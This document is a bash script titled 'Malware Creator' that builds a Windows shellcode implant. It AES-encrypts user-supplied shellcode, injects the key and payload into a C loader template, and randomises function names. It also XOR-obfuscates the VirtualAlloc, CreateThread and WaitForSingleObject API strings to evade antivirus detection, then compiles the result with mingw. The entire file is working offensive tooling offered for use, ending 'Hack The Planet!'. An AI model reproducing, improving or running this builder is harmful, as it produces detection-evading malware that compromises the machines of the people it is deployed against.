#!/bin/bash
cat << "EOF"
___  ___      _                          _____                _             
|  \/  |     | |                        /  __ \              | |            
| .  . | __ _| |_      ____ _ _ __ ___  | /  \/_ __ ___  __ _| |_ ___  _ __ 
| |\/| |/ _` | \ \ /\ / / _` | '__/ _ \ | |   | '__/ _ \/ _` | __/ _ \| '__|
| |  | | (_| | |\ V  V / (_| | | |  __/ | \__/\ | |  __/ (_| | || (_) | |   
\_|  |_/\__,_|_| \_/\_/ \__,_|_|  \___|  \____/_|  \___|\__,_|\__\___/|_|   


                           ***by assume_breach***
EOF
echo ""
echo "Where is your shellcode?"
echo ""
read Shellcode
echo ""
echo "Pick a name for your new implant."
echo ""
read MALWARE
echo ""
cp xor.py Resources/xor.py
cp malware.c Resources/malware.c
echo "***Encryption Has Started***"
echo ""
sleep 2
python3 Resources/AES.py $Shellcode > shell.txt
echo "***Payload Encrypted***"
echo ""
cp shell.txt shell2.txt
#Copy AES Key Into Resources/Malware.c

aeskey=$(cat "shell2.txt")
cut -d 'P' -f1 shell2.txt > shell3.txt
aeskeys=$(cat shell3.txt)
aeskeysnow=${aeskeys#*=}
sed -i "s/AESKEY/$aeskeysnow/g" Resources/malware.c

#Copy AES Payload Into Resources/Malware.c

aespayload=$(cat "shell.txt")
aespayloadnow=${aespayload#*;}
aespayloadtoday=${aespayloadnow#*=}
echo $aespayloadtoday > shell5.txt
perl -pe 's/AESPAYLOAD/`cat shell5.txt`/ge' -i Resources/malware.c

#Replace Function Names With Random Values

#AES Function Name
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-8} | head -n 1 > shell.txt
Random1=$(cat shell.txt)
sed -i "s/Random1/$Random1/g" Resources/malware.c

#XOR Function Name
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
Random2=$(cat shell.txt)
sed -i "s/Random2/$Random2/g" Resources/malware.c

#pVirtualAlloc 
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
Random3=$(cat shell.txt)
sed -i "s/Random3/$Random3/g" Resources/malware.c

#pCreateThread
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
Random4=$(cat shell.txt)
sed -i "s/Random4/$Random4/g" Resources/malware.c

#pWaitForSingleObject
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
Random5=$(cat shell.txt)
sed -i "s/Random5/$Random5/g" Resources/malware.c

#VirtAlloc
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
Random6=$(cat shell.txt)
sed -i "s/Random6/$Random6/g" Resources/malware.c

#CreatThr
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
Random7=$(cat shell.txt)
sed -i "s/Random7/$Random7/g" Resources/malware.c

#WaitMe
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
Random8=$(cat shell.txt)
sed -i "s/Random8/$Random8/g" Resources/malware.c

#cexe
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
Random9=$(cat shell.txt)
sed -i "s/Random9/$Random9/g" Resources/malware.c

#vr
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-4} | head -n 1 > shell.txt
RandomA=$(cat shell.txt)
sed -i "s/RandomA/$RandomA/g" Resources/malware.c

#ht
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-3} | head -n 1 > shell.txt
RandomB=$(cat shell.txt)
sed -i "s/RandomB/$RandomB/g" Resources/malware.c

#another_encry
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-7} | head -n 1 > shell.txt
RandomC=$(cat shell.txt)
sed -i "s/RandomC/$RandomC/g" Resources/malware.c

#saekey
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-6} | head -n 1 > shell.txt
RandomD=$(cat shell.txt)
sed -i "s/RandomD/$RandomD/g" Resources/malware.c

#loadme
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-6} | head -n 1 > shell.txt
RandomE=$(cat shell.txt)
sed -i "s/RandomE/$RandomE/g" Resources/malware.c

#XOR KEY

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > shell.txt
XORKEY=$(cat shell.txt)
sed -i "s/XORKEY/$XORKEY/g" Resources/malware.c
sed -i "s/XORKEY/$XORKEY/g" Resources/xor.py

#VirtualAlloc Encrypted String
echo VirtualAlloc > virt.txt
python3 Resources/xor.py virt.txt > virtalloc.txt
virt=$(cat virtalloc.txt)
virt2="${virt::-8}" 
sed -i "s/VirtualAlloc/$virt2/g" Resources/malware.c
rm virt*

#CreateThread Encrypted String
echo CreateThread > create.txt
python3 Resources/xor.py create.txt > createthread.txt
create=$(cat createthread.txt)
create2="${create::-8}" 
sed -i "s/CreateThread/$create2/g" Resources/malware.c
rm create*

#WaitForSingleObject
echo WaitForSingleObject > wait.txt
python3 Resources/xor.py wait.txt > waitfor.txt
wait=$(cat waitfor.txt)
wait2="${wait}" 
sed -i "s/WaitForSingleObject/$wait2/g" Resources/malware.c
rm wait*
rm shell*

echo "***Compiling Your New Implant**"
echo ""
sleep 2
x86_64-w64-mingw32-g++ -o $MALWARE Resources/malware.c -fpermissive -Wno-narrowing >/dev/null 2>&1
sleep 2
echo "***Malware Compiled! Hack The Planet!***"
echo ""
